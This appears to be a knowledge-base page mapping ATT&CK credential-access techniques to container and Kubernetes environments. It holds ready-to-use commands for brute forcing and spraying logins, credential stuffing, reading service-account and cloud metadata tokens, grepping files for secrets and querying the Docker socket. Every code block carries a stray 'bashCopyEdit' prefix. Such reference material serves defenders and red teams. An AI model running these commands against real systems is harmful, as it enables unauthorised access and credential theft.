# Credentialed Access

### Credential Access in Containerized Environments

In containerized infrastructures, adversaries may seek credentials to escalate privileges, move laterally, or maintain persistence. This involves brute-forcing login interfaces (T1110), extracting secrets from files or mounted volumes, and stealing application-level access tokens from metadata services or pods.

***

#### 🧠 Brute Force → **Password Guessing (T1110.001)**

**Description**: Attempt to guess passwords through repeated login attempts.

**Container Example**:

*   Attacker brute-forces internal services like Redis, MySQL, Jenkins, or dashboards exposed via NodePort/Ingress:

    ```bash
    bashCopyEdithydra -l admin -P rockyou.txt http://<service-ip>/login
    ```
* Common targets: ArgoCD, Grafana, Kubeapps, Harbor, Kubernetes Dashboard.

**Goal**: Gain access to exposed services with weak authentication mechanisms.

***

#### 🧠 Brute Force → **Password Spraying (T1110.003)**

**Description**: Attempt the same password across multiple accounts to avoid lockout.

**Container Example**:

*   Spray `Password123!` across all known usernames (e.g., from ConfigMaps or public repos):

    ```bash
    bashCopyEdithydra -L users.txt -p Password123! http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
    ```

**Realistic Targets**:

* Internal GitLab, Keycloak, internal dashboards with multiple users.

***

#### 🧠 Brute Force → **Credential Stuffing (T1110.004)**

**Description**: Use leaked or stolen username/password pairs to access services.

**Container Example**:

*   Try known breached credentials from `haveibeenpwned`, GitHub leaks, or phishing:

    ```bash
    bashCopyEditcrackmapexec http <target-ip> -u users.txt -p passwords.txt
    ```

**Kubernetes Specific**:

* Use credentials to authenticate against exposed services, private registries, or web UIs.

***

#### 🎟️ Steal Application Access Token (T1528)

**Description**: Steal cloud provider metadata tokens or service account tokens to impersonate applications.

**Container Example**:

*   Inside compromised container:

    ```bash
    bashCopyEditcat /var/run/secrets/kubernetes.io/serviceaccount/token
    ```
*   AWS (from EC2, EKS pod):

    ```bash
    bashCopyEditcurl -H "X-aws-ec2-metadata-token: TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
    ```
*   GCP (from GKE or Cloud Run):

    ```bash
    bashCopyEditcurl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
    ```

**Outcome**: Access APIs, Kubernetes clusters, or cloud services without valid user credentials.

***

#### 📂 Unsecured Credentials → **Credentials in Files (T1552.001)**

**Description**: Extract hardcoded or mounted credentials from known file locations.

**Container Example**:

*   Scan image or mounted volume for:

    ```bash
    bashCopyEditfind / -name "*.env" -o -name "*.yaml" -o -name "*config*" 2>/dev/null | xargs grep -Ei "pass|token|api_key|secret"
    ```

**Common Targets**:

* Kubernetes secrets accidentally mounted in `/etc/secrets/`, `/var/run/secrets/`, or embedded in container images.

***

#### 📦 Unsecured Credentials → **Container API (T1552.007)**

**Description**: Abuse exposed container APIs (e.g., Docker API or Kubernetes API) to retrieve secrets or container environment data.

**Container Example**:

*   Access the Docker socket:

    ```bash
    bashCopyEditcurl --unix-socket /var/run/docker.sock http://localhost/containers/json
    ```
*   Query environment variables with embedded credentials:

    ```bash
    bashCopyEditkubectl exec -it <pod> -- env | grep -Ei "secret|key|token"
    ```

**Impact**:

* Retrieve secrets from environment variables, configurations, or even mounted volumes used for automation/authentication.

***

### 🔎 Summary Table

| Technique               | Sub-Technique        | Containerized Use Case                              |
| ----------------------- | -------------------- | --------------------------------------------------- |
| Brute Force             | Password Guessing    | Use `hydra` or `medusa` to brute exposed dashboards |
| Brute Force             | Password Spraying    | Attempt common passwords across all users           |
| Brute Force             | Credential Stuffing  | Use leaked creds to hit known web interfaces        |
| Steal Application Token | —                    | Grab K8s SA token or cloud metadata credentials     |
| Unsecured Credentials   | Credentials in Files | Look for secrets in mounted volumes, env files      |
| Unsecured Credentials   | Container API        | Abuse Docker/Kubelet API or env to steal secrets    |
